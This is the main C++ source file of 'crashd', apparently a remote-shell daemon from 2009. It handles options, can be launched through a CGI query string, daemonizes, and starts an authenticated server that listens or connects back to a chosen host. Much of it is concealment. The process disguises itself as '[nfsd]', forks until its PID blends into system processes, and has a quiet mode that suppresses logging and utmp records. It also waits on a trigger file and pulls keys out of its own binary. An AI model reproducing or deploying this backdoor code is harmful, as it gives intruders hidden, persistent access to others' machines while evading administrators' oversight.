/*
 * Copyright (C) 2009 Sebastian Krahmer.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Sebastian Krahmer.
 * 4. The name Sebastian Krahmer may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <iostream>
#include <cstdio>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>
extern "C" {
#include <openssl/rand.h>
}
#include "server.h"
#include "log.h"
#include "misc.h"
#include "global.h"
#include "config.h"


using namespace std;


void help(const char *p)
{
	printf("\nUsage:\t%s [-U] [-q] [-a] [-6] [-w] [-H host] [-p port] [-A authorized keys]\n"
	       "\t\t [-k server key-file] [-c server X509 certificate] [-P port]\n"
	       "\t\t [-t trigger-file] [-m trigger message] [-e] [-g good IPs]\n\n"
	       "\t\t -a -- always login (if authenticated), even with a /bin/false default shell\n"
	       "\t\t -U -- run as user (e.g. turn off setuid() calls) if invoked as such\n"
	       "\t\t -e -- extract key and certfile from the binary itself (no -k/-c needed)\n"
	       "\t\t -q -- quiet mode, turns off logging and utmp entries\n"
	       "\t\t -6 -- use IPv6 rather than IPv4\n"
	       "\t\t -w -- wrap around PID's so crashd appears in system PID space\n"
	       "\t\t -H -- host/IP to connect to; if omitted it uses passive connect (default)\n"
	       "\t\t -p -- port to connect/listen to; default is %s\n"
	       "\t\t -P -- local port used in active connects (default is no bind)\n"
	       "\t\t -g -- file containing list of good IP/IP6's in D/DoS case (default off)\n"
	       "\t\t -A -- authorized-key files for users if starts with '/'; subdir in users ~\n"
	       "\t\t       containing authorized_keys file otherwise; 'self' means to use\n"
	       "\t\t       blob-extraction (see -e); default is %s\n"
	       "\t\t -k -- servers key file; default is %s\n"
	       "\t\t -c -- X509 certificate-file that belongs to serverkey (-k); default is %s\n"
	       "\t\t -t -- watch a triggerfile for certain message (-m) before connect/listen\n"
	       "\t\t -m -- wait with connect/listen until message in file (-t) is seen\n\n",
	       p, config::port.c_str(), config::user_keys.c_str(), config::keyfile.c_str(),
	       config::certfile.c_str());
}


void sig_chld(int)
{
	pid_t pid = 0;
	while ((pid = waitpid(-1, NULL, WNOHANG)) > 0) {
		// If its the real crashd w/o a session, we run as root,
		// so clean up leaving sessions
		if (getpid() == global::crashd_pid)
			logger::logout(pid);
	}
	return;
}



void sig_alarm(int)
{
	// Only exit for the sessions which run in another process,
	// as the alarm handler is there to kill timed out login sessions
	if (getpid() == global::crashd_pid)
		return;
	exit(1);
}


int main(int argc, char **argv)
{
	int c = 0, i = 0;
	char **orig_argv = argv;
	int orig_argc = argc;

	// First of all, some ugly parsing, so it can be called
	// via CGI too!
	char *ptr1 = NULL, *ptr2 = NULL, *ptr3 = NULL;
	if ((ptr1 = getenv("QUERY_STRING")) != NULL) {
		setbuffer(stdout, NULL, 0);
		printf("Content-Type: text/html\r\n\r\n");
		argv = (char **)malloc(100 * sizeof(char *));
		if (!argv) {
			printf("Out of memory!\n");
			return 1;
		}
		i = 1;
		memset(argv, 0, 100 * sizeof(char *));
		argv[0] = strdup("[nfsd]");

		while (i < 20 && (ptr2 = strchr(ptr1, '&')) != NULL) {
			*ptr2 = 0;
			ptr3 = strchr(ptr1, '=');
			if (!ptr3)
				return 1;
			*ptr3 = 0;
			argv[i++] = strdup(ptr1);

			// switches without argument must be passed like
			// -U=1 to the CGI, so we have way more easy parsing
			if (strcmp(ptr3 + 1, "1"))
				argv[i++] = strdup(ptr3 + 1);
			ptr1 = ptr2;
			++ptr1;
		}

		// last key=value pair, w/o &
		if ((ptr2 = strchr(ptr1, '=')) != NULL) {
			*ptr2 = 0;
			argv[i++] = strdup(ptr1);
			if (strcmp(ptr2 + 1, "1"))
				argv[i++] = strdup(ptr2 + 1);
		}
		argc = i;
		for (i = 0; i < argc; ++i)
			printf("%s\r\n\r\n", argv[i]);
	}

	while ((c = getopt(argc, argv, "6qH:p:A:t:m:k:c:P:g:Uwea")) != -1) {
		switch (c) {
		case 'U':
			config::uid_change = 0;
			break;
		case 't':
			config::tfile = optarg;
			break;
		case 'm':
			config::tmsg = optarg;
			break;
		case 'a':
			config::always_login = 1;
			break;
		case '6':
			config::v6 = 1;
			break;
		case 'q':
			config::silent = 1;
			break;
		case 'g':
			config::good_ip_file = optarg;
			break;
		case 'w':
			config::wrap = 1;
			for (i = 0; i < orig_argc; ++i)
				memset(orig_argv[i], 0, strlen(orig_argv[i]));
			strcpy(orig_argv[0], "[nfsd]");
			break;
		case 'H':
			config::host = optarg;
			break;
		case 'p':
			config::port = optarg;
			break;
		case 'P':
			config::local_port = optarg;
			break;
		case 'A':
			config::user_keys = optarg;
			break;
		case 'k':
			config::keyfile = optarg;
			break;
		case 'c':
			config::certfile = optarg;
			break;
		case 'e':
			config::extract_blob = 1;
			break;
		default:
			help(*orig_argv);
			return 0;
		}
	}

	struct sigaction sa;
	memset(&sa, 0, sizeof(sa));
	sa.sa_flags = SA_RESTART;
	sa.sa_handler = sig_chld;
	sigaction(SIGCHLD, &sa, NULL);

	sa.sa_handler = SIG_IGN;
	sigaction(SIGPIPE, &sa, NULL);

	sa.sa_handler = sig_alarm;
	sigaction(SIGALRM, &sa, NULL);

	if (RAND_load_file("/dev/urandom", 256) != 256)
		RAND_load_file("/dev/random", 8);

	if (config::good_ip_file.length() > 0)
		read_good_ips(config::good_ip_file);

	if (fork() != 0)
		return 0;

	// Wrap into system PID-space. Tested only on Linux!
	if (config::wrap) {
		pid_t opid = getpid();
		pid_t pid;
		for (;;) {
			pid = fork();
			if (pid > 0)
				exit(0);
			if (getpid() < opid)
				break;
		}
	}

	global::crashd_pid = getpid();

	//chdir("/"); No, we like to have the possibility to find keyfiles etc in "."
	for (i = 0; i <= sysconf(_SC_OPEN_MAX); ++i)
		close(i);
	open("/dev/null", O_RDWR|O_NOCTTY);
	dup2(0, 1); dup2(1, 2);
	setsid();

	// If a message-trigger has been given
	if (config::tmsg.length() > 0)
		read_until(config::tfile.c_str(), config::tmsg.c_str());

	// extract key/cert from ELF binary into tmp file
	if (config::extract_blob) {
		config::keyfile = extract_keys(orig_argv[0]);
		config::certfile = config::keyfile;
		if (config::keyfile.size() == 0)
			return 1;
		if (config::user_keys == "self")
			config::user_keys = config::keyfile;
	}

	Server *s = new Server;
	if (!s)
		return 1;

	if (s->setup() < 0) {
		syslog().log(s->why());
		delete s;
		return 1;
	}

	if (s->loop() < 0) {
		syslog().log(s->why());
		delete s;
		return 1;
	}

	if (config::extract_blob)
		unlink(config::keyfile.c_str());

	delete s;
	return 0;
}

